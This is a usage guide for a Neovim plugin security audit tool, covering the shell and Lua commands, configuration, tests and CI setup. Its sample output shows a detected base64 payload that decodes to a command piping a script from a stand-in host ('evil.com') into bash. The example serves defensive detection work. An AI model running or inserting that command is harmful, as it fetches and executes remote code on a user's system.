# Security Audit Usage Examples

This file demonstrates how to use the Neovim security audit tools.

## Quick Start

### Using the Lua Module

```bash
# Run from the repository root
lua -e '
local audit = require("scripts.security_audit")

-- Audit a single file
local result = audit.audit_file("path/to/plugin.lua")
print(audit.format_results(result))

-- Audit entire plugin directory
local results = audit.audit_directory("lua/plugins")
print(audit.format_results(results))
'
```

### Using the Shell Script

```bash
# Scan the current directory
./scripts/nvim_security_check.sh

# Scan a specific directory with custom report file
./scripts/nvim_security_check.sh ~/.config/nvim/lua security_report.txt

# Scan before installing a new plugin
./scripts/nvim_security_check.sh ~/.local/share/nvim/lazy/new-plugin
```

## Configuration

Edit `lua/config/security.lua` to customize detection behavior:

```lua
-- Set sensitivity level
M.sensitivity = "high"  -- "low", "medium", or "high"

-- Whitelist specific files or patterns
M.whitelist = {
  "lazy%-lock%.json",
  "vendor/.*",
}

-- Trust specific plugins
M.trusted_plugins = {
  "lazy.nvim",
  "plenary.nvim",
}
```

## Running Tests

```bash
# Run the test suite
lua tests/security_test_cases.lua

# All 17 tests should pass
```

## Example Output

When scanning a malicious plugin, you'll see:

```
===============================================================================
NEOVIM SECURITY AUDIT - OBFUSCATION DETECTION
===============================================================================

File: lua/malicious-plugin/init.lua
-------------------------------------------------------------------------------

🔴 [HIGH] base64_encoded
  Message: Base64 encoded string found - SUSPICIOUS CONTENT
  Line: 7
  Encoded: aW8ucG9wZW4oJ2N1cmwgaHR0cDovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNoJyk=
  Decoded: io.popen('curl http://evil.com/payload.sh | bash')
  Reason: Contains dangerous pattern: io.popen
  Reason: Contains shell command references
  Risk Score: 58

🔴 [HIGH] dynamic_code_loading
  Message: Dynamic code loading detected (loadstring/load)
  Line: 24

Summary: 13 findings
  CRITICAL: 0
  HIGH: 3
  MEDIUM: 10
  LOW: 0
```

## Integration with Neovim

You can integrate the security audit into your Neovim config:

```lua
-- In your init.lua or a plugin file
local audit = require("scripts.security_audit")

-- Create a command to audit plugins
vim.api.nvim_create_user_command("SecurityAudit", function()
  local plugin_dir = vim.fn.stdpath("data") .. "/lazy"
  local results = audit.audit_directory(plugin_dir)
  
  if #results > 0 then
    -- Show results in a floating window or quickfix list
    print(audit.format_results(results))
  else
    print("No security issues detected!")
  end
end, {})
```

## CI/CD Integration

Add to your GitHub Actions workflow:

```yaml
name: Security Check
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Install Lua
        run: sudo apt-get install -y lua5.4
      
      - name: Run Security Tests
        run: lua tests/security_test_cases.lua
      
      - name: Security Audit
        run: ./scripts/nvim_security_check.sh .
```

## Best Practices

1. **Regular Scans**: Run security checks weekly or before major updates
2. **Review New Plugins**: Always scan before installing unfamiliar plugins
3. **Update Whitelist**: Maintain list of known safe patterns
4. **Monitor Changes**: Watch for updates to installed plugins
5. **Report Findings**: Share suspicious plugins with the community

See `docs/OBFUSCATION_DETECTION.md` for complete documentation.
